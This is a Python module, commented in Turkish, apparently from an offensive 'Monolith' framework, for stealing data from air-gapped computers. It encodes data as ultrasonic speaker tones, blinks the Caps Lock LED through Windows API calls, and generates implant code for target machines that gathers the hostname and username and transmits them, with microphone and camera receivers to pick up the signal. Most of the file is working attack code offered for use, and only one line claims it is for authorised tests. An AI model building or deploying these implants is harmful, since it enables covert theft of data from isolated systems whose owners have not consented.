#!/usr/bin/env python3
"""
Air-Gap Jumping Module - Fiziksel İzolasyonu Aşmak
İnternete bağlı olmayan bilgisayarlardan veri çalma teknikleri.

Features:
1. Ultrasonic Data Exfiltration - Ses ile veri kaçırma (18kHz+)
2. LED Morse Exfiltration - Caps Lock/HDD LED ile veri aktarma

WARNING: Bu modül yalnızca yetkili penetrasyon testleri içindir!
"""

import struct
import math
import wave
import io
import base64
import time
import threading
import json
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Dict, Optional, Tuple, Any
from datetime import datetime
import hashlib


class ExfilMethod(Enum):
    """Veri kaçırma yöntemleri"""
    ULTRASONIC = "ultrasonic"
    LED_MORSE = "led_morse"
    LED_BINARY = "led_binary"
    SCREEN_BRIGHTNESS = "screen_brightness"
    FAN_SPEED = "fan_speed"


class LEDType(Enum):
    """LED tipleri"""
    CAPS_LOCK = "caps_lock"
    NUM_LOCK = "num_lock"
    SCROLL_LOCK = "scroll_lock"
    HDD_LED = "hdd_led"
    POWER_LED = "power_led"


class UltrasonicFrequency(Enum):
    """Ultrasonik frekans bantları"""
    LOW = 18000      # 18 kHz - Daha az tespit edilebilir
    MEDIUM = 19000   # 19 kHz - Orta
    HIGH = 20000     # 20 kHz - İnsan kulağı sınırı
    ULTRA = 21000    # 21 kHz - Tamamen duyulmaz


@dataclass
class ExfilSession:
    """Veri kaçırma oturumu"""
    session_id: str
    method: ExfilMethod
    start_time: datetime
    data_size: int = 0
    packets_sent: int = 0
    status: str = "initialized"
    error_correction: bool = True
    encryption: bool = True
    
    
@dataclass
class UltrasonicConfig:
    """Ultrasonik yapılandırma"""
    frequency: int = 19000          # Hz
    sample_rate: int = 44100        # Sample rate
    bit_duration: float = 0.01      # Her bit için süre (saniye)
    amplitude: float = 0.8          # Ses seviyesi (0-1)
    preamble_freq: int = 18500      # Senkronizasyon frekansı
    mark_freq: int = 19000          # Bit 1 frekansı
    space_freq: int = 19500         # Bit 0 frekansı
    use_fsk: bool = True            # Frequency Shift Keying
    error_correction: bool = True   # Hamming code


@dataclass
class LEDConfig:
    """LED yapılandırma"""
    led_type: LEDType = LEDType.CAPS_LOCK
    bit_duration: float = 0.05      # Her bit için süre (saniye)
    use_morse: bool = False         # Morse kodu kullan
    dot_duration: float = 0.1       # Morse nokta süresi
    dash_duration: float = 0.3      # Morse çizgi süresi
    word_gap: float = 0.7           # Kelime arası boşluk


class UltrasonicExfiltrator:
    """
    Ultrasonik Veri Kaçırma Sistemi
    
    Bilgisayarın hoparlöründen 18-21 kHz arası sesler çıkararak
    veri aktarır. İnsan kulağı bu sesleri duyamaz.
    """
    
    MORSE_CODE = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..', '0': '-----', '1': '.----', '2': '..---',
        '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...',
        '8': '---..', '9': '----.', ' ': '/'
    }
    
    def __init__(self, config: Optional[UltrasonicConfig] = None):
        self.config = config or UltrasonicConfig()
        self.is_transmitting = False
        self.current_session: Optional[ExfilSession] = None
        
    def _generate_tone(self, frequency: int, duration: float, 
                       sample_rate: int = 44100, amplitude: float = 0.8) -> bytes:
        """Belirli frekansta ton üret"""
        num_samples = int(sample_rate * duration)
        samples = []
        
        for i in range(num_samples):
            t = i / sample_rate
            # Sinüs dalgası
            sample = amplitude * math.sin(2 * math.pi * frequency * t)
            # Fade in/out for click prevention
            if i < 100:
                sample *= i / 100
            elif i > num_samples - 100:
                sample *= (num_samples - i) / 100
            samples.append(int(sample * 32767))
        
        return struct.pack('<%dh' % len(samples), *samples)
    
    def _encode_byte_fsk(self, byte: int) -> bytes:
        """Byte'ı FSK ile encode et"""
        audio_data = b''
        
        for bit_pos in range(8):
            bit = (byte >> (7 - bit_pos)) & 1
            freq = self.config.mark_freq if bit else self.config.space_freq
            tone = self._generate_tone(
                freq, 
                self.config.bit_duration,
                self.config.sample_rate,
                self.config.amplitude
            )
            audio_data += tone
            
        return audio_data
    
    def _add_error_correction(self, data: bytes) -> bytes:
        """Hamming(7,4) error correction ekle"""
        encoded = []
        for byte in data:
            # Her byte için 2 hamming code word (4 bit each)
            for nibble_pos in [4, 0]:
                nibble = (byte >> nibble_pos) & 0x0F
                d1, d2, d3, d4 = (nibble >> 3) & 1, (nibble >> 2) & 1, (nibble >> 1) & 1, nibble & 1
                p1 = d1 ^ d2 ^ d4
                p2 = d1 ^ d3 ^ d4
                p3 = d2 ^ d3 ^ d4
                encoded.append((p1 << 6) | (p2 << 5) | (d1 << 4) | (p3 << 3) | (d2 << 2) | (d3 << 1) | d4)
        return bytes(encoded)
    
    def encode_data(self, data: bytes) -> bytes:
        """Veriyi ultrasonik sinyale dönüştür"""
        if self.config.error_correction:
            data = self._add_error_correction(data)
        
        # WAV header
        audio_data = b''
        
        # Preamble - senkronizasyon için
        preamble = self._generate_tone(
            self.config.preamble_freq,
            0.1,  # 100ms preamble
            self.config.sample_rate,
            self.config.amplitude
        )
        audio_data += preamble
        
        # Data length (4 bytes)
        length_bytes = struct.pack('>I', len(data))
        for byte in length_bytes:
            audio_data += self._encode_byte_fsk(byte)
        
        # Actual data
        for byte in data:
            audio_data += self._encode_byte_fsk(byte)
        
        # Postamble
        postamble = self._generate_tone(
            self.config.preamble_freq + 500,
            0.05,
            self.config.sample_rate,
            self.config.amplitude
        )
        audio_data += postamble
        
        return audio_data
    
    def create_wav(self, data: bytes) -> bytes:
        """WAV dosyası oluştur"""
        audio_data = self.encode_data(data)
        
        # WAV file oluştur
        wav_buffer = io.BytesIO()
        with wave.open(wav_buffer, 'wb') as wav_file:
            wav_file.setnchannels(1)
            wav_file.setsampwidth(2)
            wav_file.setframerate(self.config.sample_rate)
            wav_file.writeframes(audio_data)
        
        return wav_buffer.getvalue()
    
    def create_transmit_payload(self, data: str, encrypt: bool = True) -> Dict[str, Any]:
        """Transmit için payload oluştur"""
        data_bytes = data.encode('utf-8')
        
        if encrypt:
            # Basit XOR encryption (demo)
            key = b'AIRGAP_KEY_2026!'
            encrypted = bytes([data_bytes[i] ^ key[i % len(key)] for i in range(len(data_bytes))])
            data_bytes = encrypted
        
        wav_data = self.create_wav(data_bytes)
        
        return {
            'wav_base64': base64.b64encode(wav_data).decode('ascii'),
            'frequency': self.config.frequency,
            'duration': len(data_bytes) * 8 * self.config.bit_duration + 0.2,
            'data_size': len(data_bytes),
            'encrypted': encrypt,
            'checksum': hashlib.md5(data_bytes).hexdigest()[:8]
        }
    
    def generate_receiver_code(self) -> str:
        """Mobil alıcı için kod üret"""
        return f'''
// Monolith Mobile Receiver - Ultrasonic Decoder
// Frequency: {self.config.mark_freq}Hz / {self.config.space_freq}Hz

class UltrasonicReceiver {{
    constructor() {{
        this.sampleRate = {self.config.sample_rate};
        this.markFreq = {self.config.mark_freq};
        this.spaceFreq = {self.config.space_freq};
        this.bitDuration = {self.config.bit_duration};
        this.audioContext = new (window.AudioContext || window.webkitAudioContext)();
    }}
    
    async startListening() {{
        const stream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
        const source = this.audioContext.createMediaStreamSource(stream);
        const analyser = this.audioContext.createAnalyser();
        analyser.fftSize = 2048;
        source.connect(analyser);
        
        this.decode(analyser);
    }}
    
    decode(analyser) {{
        const bufferLength = analyser.frequencyBinCount;
        const dataArray = new Uint8Array(bufferLength);
        
        const process = () => {{
            analyser.getByteFrequencyData(dataArray);
            // Frequency detection logic here
            requestAnimationFrame(process);
        }};
        process();
    }}
}}
'''


class LEDExfiltrator:
    """
    LED ile Veri Kaçırma Sistemi
    
    Caps Lock, Num Lock veya HDD LED'ini hızlıca yakıp söndürerek
    binary veya Morse kod ile veri aktarır.
    """
    
    MORSE_CODE = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..', '0': '-----', '1': '.----', '2': '..---',
        '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...',
        '8': '---..', '9': '----.', ' ': '/'
    }
    
    def __init__(self, config: Optional[LEDConfig] = None):
        self.config = config or LEDConfig()
        self.is_transmitting = False
        self.current_session: Optional[ExfilSession] = None
    
    def text_to_morse(self, text: str) -> str:
        """Metni Morse koduna çevir"""
        morse = []
        for char in text.upper():
            if char in self.MORSE_CODE:
                morse.append(self.MORSE_CODE[char])
        return ' '.join(morse)
    
    def bytes_to_binary_pattern(self, data: bytes) -> List[Tuple[bool, float]]:
        """Bytes'ı LED pattern'ine çevir (state, duration)"""
        pattern = []
        
        # Preamble - 5 rapid blinks
        for _ in range(5):
            pattern.append((True, 0.02))
            pattern.append((False, 0.02))
        
        # Data
        for byte in data:
            for bit_pos in range(8):
                bit = (byte >> (7 - bit_pos)) & 1
                pattern.append((bool(bit), self.config.bit_duration))
            # Byte separator
            pattern.append((False, self.config.bit_duration * 2))
        
        # End marker - long blink
        pattern.append((True, 0.2))
        pattern.append((False, 0.1))
        
        return pattern
    
    def text_to_morse_pattern(self, text: str) -> List[Tuple[bool, float]]:
        """Metni Morse LED pattern'ine çevir"""
        pattern = []
        morse = self.text_to_morse(text)
        
        for symbol in morse:
            if symbol == '.':
                pattern.append((True, self.config.dot_duration))
                pattern.append((False, self.config.dot_duration))
            elif symbol == '-':
                pattern.append((True, self.config.dash_duration))
                pattern.append((False, self.config.dot_duration))
            elif symbol == ' ':
                pattern.append((False, self.config.dash_duration))
            elif symbol == '/':
                pattern.append((False, self.config.word_gap))
        
        return pattern
    
    def create_transmit_payload(self, data: str, use_morse: bool = False) -> Dict[str, Any]:
        """Transmit için payload oluştur"""
        if use_morse:
            pattern = self.text_to_morse_pattern(data)
            morse_code = self.text_to_morse(data)
        else:
            data_bytes = data.encode('utf-8')
            pattern = self.bytes_to_binary_pattern(data_bytes)
            morse_code = None
        
        total_duration = sum(p[1] for p in pattern)
        
        return {
            'led_type': self.config.led_type.value,
            'pattern': [(int(state), duration) for state, duration in pattern],
            'total_duration': total_duration,
            'data_size': len(data),
            'use_morse': use_morse,
            'morse_code': morse_code,
            'bit_rate': len(data) * 8 / total_duration if not use_morse else None
        }
    
    def generate_implant_code(self) -> str:
        """Hedef sistem için implant kodu üret"""
        return f'''
# Air-Gap LED Exfiltrator Implant
# LED Type: {self.config.led_type.value}

import ctypes
import time

class LEDController:
    """Keyboard LED controller for Windows"""
    
    VK_CAPITAL = 0x14  # Caps Lock
    VK_NUMLOCK = 0x90  # Num Lock
    VK_SCROLL = 0x91   # Scroll Lock
    
    KEYEVENTF_EXTENDEDKEY = 0x0001
    KEYEVENTF_KEYUP = 0x0002
    
    def __init__(self):
        self.user32 = ctypes.windll.user32
    
    def toggle_led(self, vk_code):
        """Toggle a keyboard LED"""
        self.user32.keybd_event(vk_code, 0x45, self.KEYEVENTF_EXTENDEDKEY, 0)
        self.user32.keybd_event(vk_code, 0x45, self.KEYEVENTF_EXTENDEDKEY | self.KEYEVENTF_KEYUP, 0)
    
    def set_led(self, vk_code, state):
        """Set LED to specific state"""
        current = self.user32.GetKeyState(vk_code) & 1
        if current != state:
            self.toggle_led(vk_code)
    
    def transmit_byte(self, byte, bit_duration={self.config.bit_duration}):
        """Transmit a single byte via LED"""
        for bit_pos in range(8):
            bit = (byte >> (7 - bit_pos)) & 1
            self.set_led(self.VK_CAPITAL, bit)
            time.sleep(bit_duration)
    
    def transmit_data(self, data):
        """Transmit data bytes"""
        # Preamble
        for _ in range(5):
            self.set_led(self.VK_CAPITAL, 1)
            time.sleep(0.02)
            self.set_led(self.VK_CAPITAL, 0)
            time.sleep(0.02)
        
        # Data
        for byte in data:
            self.transmit_byte(byte)
            time.sleep({self.config.bit_duration * 2})  # Byte gap
        
        # Reset
        self.set_led(self.VK_CAPITAL, 0)

# Usage
if __name__ == "__main__":
    controller = LEDController()
    secret_data = b"STOLEN_PASSWORD_123"
    controller.transmit_data(secret_data)
'''
    
    def generate_receiver_code(self) -> str:
        """Kamera ile LED okuyucu kodu"""
        return '''
# LED Receiver - Video Analysis
# Requires: opencv-python, numpy

import cv2
import numpy as np
from collections import deque

class LEDReceiver:
    def __init__(self, roi=None):
        self.roi = roi  # Region of interest (x, y, w, h)
        self.threshold = 200  # Brightness threshold
        self.samples = deque(maxlen=1000)
        self.bit_duration = 0.05  # seconds
        
    def process_frame(self, frame):
        """Process a video frame"""
        if self.roi:
            x, y, w, h = self.roi
            region = frame[y:y+h, x:x+w]
        else:
            region = frame
        
        # Convert to grayscale and get brightness
        gray = cv2.cvtColor(region, cv2.COLOR_BGR2GRAY)
        brightness = np.mean(gray)
        
        # Determine LED state
        led_on = brightness > self.threshold
        self.samples.append(led_on)
        
        return led_on, brightness
    
    def decode_samples(self):
        """Decode collected samples to bytes"""
        samples = list(self.samples)
        # Find preamble pattern
        # Decode bits based on timing
        # Return decoded bytes
        pass
    
    def start_capture(self, camera_id=0):
        """Start video capture"""
        cap = cv2.VideoCapture(camera_id)
        
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            
            led_on, brightness = self.process_frame(frame)
            
            # Display
            status = "ON" if led_on else "OFF"
            cv2.putText(frame, f"LED: {status} ({brightness:.1f})", 
                       (10, 30), cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 255, 0), 2)
            cv2.imshow("LED Receiver", frame)
            
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        
        cap.release()
        cv2.destroyAllWindows()
'''


class AirGapJumper:
    """
    Air-Gap Jumping Ana Sınıfı
    
    Fiziksel olarak izole edilmiş sistemlerden veri çalmak için
    çeşitli covert channel teknikleri.
    """
    
    EXFIL_METHODS = {
        'ultrasonic': {
            'name': 'Ultrasonic Exfiltration',
            'description': 'Hoparlörden 18-21kHz ses ile veri aktarımı',
            'icon': '🔊',
            'speed': '~50 bps',
            'range': '1-5 metre',
            'detection_risk': 'Düşük'
        },
        'led_binary': {
            'name': 'LED Binary Exfiltration',
            'description': 'Caps Lock LED ile binary veri aktarımı',
            'icon': '💡',
            'speed': '~20 bps',
            'range': 'Görüş mesafesi',
            'detection_risk': 'Orta'
        },
        'led_morse': {
            'name': 'LED Morse Exfiltration',
            'description': 'LED ile Morse kodu aktarımı',
            'icon': '📡',
            'speed': '~5 bps',
            'range': 'Görüş mesafesi',
            'detection_risk': 'Düşük'
        },
        'screen_brightness': {
            'name': 'Screen Brightness Modulation',
            'description': 'Ekran parlaklığı ile veri aktarımı',
            'icon': '🖥️',
            'speed': '~100 bps',
            'range': '5-20 metre',
            'detection_risk': 'Çok Düşük'
        },
        'fan_acoustic': {
            'name': 'Fan Acoustic Exfiltration',
            'description': 'Fan hızı ile akustik veri aktarımı',
            'icon': '🌀',
            'speed': '~15 bps',
            'range': '1-8 metre',
            'detection_risk': 'Çok Düşük'
        },
        'em_emanation': {
            'name': 'EM Emanation',
            'description': 'Elektromanyetik sızıntı ile veri aktarımı',
            'icon': '📻',
            'speed': '~1000 bps',
            'range': '1-10 metre',
            'detection_risk': 'Yüksek'
        }
    }
    
    def __init__(self):
        self.ultrasonic = UltrasonicExfiltrator()
        self.led = LEDExfiltrator()
        self.sessions: Dict[str, ExfilSession] = {}
    
    def get_methods(self) -> Dict[str, Any]:
        """Mevcut exfiltration methodlarını döndür"""
        return self.EXFIL_METHODS
    
    def create_session(self, method: str) -> ExfilSession:
        """Yeni exfil session oluştur"""
        session_id = hashlib.md5(f"{time.time()}".encode()).hexdigest()[:12]
        session = ExfilSession(
            session_id=session_id,
            method=ExfilMethod(method),
            start_time=datetime.now()
        )
        self.sessions[session_id] = session
        return session
    
    def prepare_ultrasonic_transmission(self, data: str, 
                                        frequency: int = 19000,
                                        encrypt: bool = True) -> Dict[str, Any]:
        """Ultrasonik transmisyon hazırla"""
        self.ultrasonic.config.frequency = frequency
        self.ultrasonic.config.mark_freq = frequency
        self.ultrasonic.config.space_freq = frequency + 500
        
        payload = self.ultrasonic.create_transmit_payload(data, encrypt)
        receiver_code = self.ultrasonic.generate_receiver_code()
        
        return {
            'payload': payload,
            'receiver_code': receiver_code,
            'config': {
                'frequency': frequency,
                'mark_freq': self.ultrasonic.config.mark_freq,
                'space_freq': self.ultrasonic.config.space_freq,
                'bit_duration': self.ultrasonic.config.bit_duration
            }
        }
    
    def prepare_led_transmission(self, data: str, 
                                 led_type: str = 'caps_lock',
                                 use_morse: bool = False) -> Dict[str, Any]:
        """LED transmisyon hazırla"""
        self.led.config.led_type = LEDType(led_type)
        self.led.config.use_morse = use_morse
        
        payload = self.led.create_transmit_payload(data, use_morse)
        implant_code = self.led.generate_implant_code()
        receiver_code = self.led.generate_receiver_code()
        
        return {
            'payload': payload,
            'implant_code': implant_code,
            'receiver_code': receiver_code,
            'config': {
                'led_type': led_type,
                'use_morse': use_morse,
                'bit_duration': self.led.config.bit_duration
            }
        }
    
    def generate_full_implant(self, methods: List[str] = None) -> str:
        """Tam implant kodu üret"""
        if methods is None:
            methods = ['ultrasonic', 'led_binary']
        
        implant = '''#!/usr/bin/env python3
"""
Air-Gap Exfiltration Implant
Auto-generated by Monolith Framework
"""

import os
import sys
import time
import struct
import threading

'''
        
        if 'ultrasonic' in methods:
            implant += '''
# === ULTRASONIC MODULE ===
import wave
import math

class UltrasonicTransmitter:
    def __init__(self, freq=19000, sample_rate=44100):
        self.freq = freq
        self.sample_rate = sample_rate
    
    def generate_tone(self, frequency, duration, amplitude=0.8):
        num_samples = int(self.sample_rate * duration)
        samples = []
        for i in range(num_samples):
            t = i / self.sample_rate
            sample = amplitude * math.sin(2 * math.pi * frequency * t)
            samples.append(int(sample * 32767))
        return struct.pack('<%dh' % len(samples), *samples)
    
    def transmit(self, data):
        # Generate and play ultrasonic signal
        pass

'''
        
        if 'led_binary' in methods or 'led_morse' in methods:
            implant += '''
# === LED MODULE ===
import ctypes

class LEDTransmitter:
    VK_CAPITAL = 0x14
    
    def __init__(self):
        self.user32 = ctypes.windll.user32
    
    def toggle(self):
        self.user32.keybd_event(self.VK_CAPITAL, 0x45, 1, 0)
        self.user32.keybd_event(self.VK_CAPITAL, 0x45, 3, 0)
    
    def set_state(self, state):
        current = self.user32.GetKeyState(self.VK_CAPITAL) & 1
        if current != state:
            self.toggle()
    
    def transmit_byte(self, byte, bit_duration=0.05):
        for i in range(8):
            bit = (byte >> (7-i)) & 1
            self.set_state(bit)
            time.sleep(bit_duration)
    
    def transmit(self, data):
        for _ in range(5):  # Preamble
            self.set_state(1)
            time.sleep(0.02)
            self.set_state(0)
            time.sleep(0.02)
        
        for byte in data:
            self.transmit_byte(byte)
            time.sleep(0.1)
        
        self.set_state(0)

'''
        
        implant += '''
# === MAIN ===
def collect_sensitive_data():
    """Collect data to exfiltrate"""
    data = []
    
    # Hostname
    data.append(f"HOST:{os.getenv('COMPUTERNAME', 'unknown')}")
    
    # Username
    data.append(f"USER:{os.getenv('USERNAME', 'unknown')}")
    
    # Add more collection logic here
    
    return "|".join(data)

def main():
    data = collect_sensitive_data()
    encoded = data.encode('utf-8')
    
    # Choose exfiltration method
    try:
        led = LEDTransmitter()
        led.transmit(encoded)
    except:
        pass

if __name__ == "__main__":
    main()
'''
        
        return implant


# Test
if __name__ == "__main__":
    jumper = AirGapJumper()
    
    # Test ultrasonic
    result = jumper.prepare_ultrasonic_transmission("SECRET_DATA_123")
    print(f"Ultrasonic payload size: {result['payload']['data_size']} bytes")
    print(f"Duration: {result['payload']['duration']:.2f} seconds")
    
    # Test LED
    result = jumper.prepare_led_transmission("HELLO", use_morse=True)
    print(f"LED Morse code: {result['payload']['morse_code']}")
    print(f"Total duration: {result['payload']['total_duration']:.2f} seconds")
